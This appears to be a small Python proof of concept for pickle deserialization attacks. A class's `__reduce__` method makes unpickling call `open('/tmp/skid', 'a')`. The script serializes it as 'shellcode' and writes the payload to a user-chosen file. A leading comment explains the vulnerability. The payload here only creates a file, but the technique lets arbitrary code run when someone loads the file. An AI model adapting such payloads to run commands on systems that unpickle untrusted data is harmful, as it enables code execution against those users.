#The code provided is vulnerable to a deserialization attack. The `Skid` class implements the `__reduce__()` method, which allows an attacker to execute arbitrary code #during deserialization. In this case, the code opens a file and writes to it, which can be abused to perform unintended actions or execute malicious commands on the #system. It is important to validate and sanitize input when deserializing untrusted data to prevent such vulnerabilities.

import _pickle as skid
import os 

# Define a custom class for serialization
class Skid:
  def __reduce__(self):
      filename = '/tmp/skid'
      return (open, (filename, 'a'), ())  # Returns a tuple with file open operation args and an empty tuple

# Define a list variable
variable = ["skid", "skid2", "skid3"]

# Serialize the list variable using _pickle.dumps() and store the result in se_data
se_data = skid.dumps(list(variable))

# Print the serialized data (in binary format)
print(se_data)

# Deserialize the serialized data using _pickle.loads() and store the result in de_data
de_data = skid.loads(se_data)

# Serialize the Skid class instance using _pickle.dumps() and store the result in shellcode
shellcode = skid.dumps(Skid())

# Prompt user for input to specify the filename or path
input = input("filename / path?> ")

# Write the shellcode to the specified file (in binary format)
with open(input, 'wb') as file_object:
  file_object.write(shellcode)```
